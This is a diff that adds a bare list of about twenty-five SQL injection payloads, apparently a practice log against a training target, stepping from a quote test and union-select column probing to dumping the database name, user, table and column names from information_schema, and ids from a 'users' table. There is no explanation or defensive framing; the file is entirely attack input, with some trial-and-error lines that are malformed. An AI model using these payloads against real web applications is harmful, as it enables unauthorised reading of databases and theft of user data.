@@ -1,0 +1,25 @@
+ID:1
+ID:1
+ID:1' -- 
+ID:1 union select 1,1
+ID:1 union select 1,1,1
+ID:1 union select database(),user()
+ID:1 union select 1 database(),user()
+ID:1 union select 1, database(),user()
+ID:1 union select 1, database(),user() limit 1,1 --
+ID:1 union select 1,group_concat(table_name),1 from information_schema.tables where table_schema=database() -- 
+ID:1 union select 1,group_concat(table_name),1 from information_schema.tables where table_schema=database()  limit 1,1-- 
+ID:1
+ID:1 union select 1, database(),user() limit 1,1 --
+ID:1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name="uagents" limit 1,1--
+ID:1 union select * from ip_address limit 1,1 -- 
+ID:1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name="uagents" limit 1,1--
+ID:1 union select 1,group_concat(table_name),1 from information_schema.tables where table_schema=database() -- 
+ID:1 union select 1,group_concat(table_name),1 from information_schema.tables where table_schema=database() limit 1,1-- 
+ID:1 union select * from uagents limit 1,1 --
+ID:1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name="users" limit 1,1--
+ID:1 union select 1,group_concat(name),1 from user
+ID:1 union select 1,group_concat(name),1 from users
+ID:1 union select 1,group_concat(id),1 from users
+ID:1 union select 1,group_concat(id),1 from users -- 
+ID:1 union select 1,group_concat(id),1 from users  limit 1,1-- 
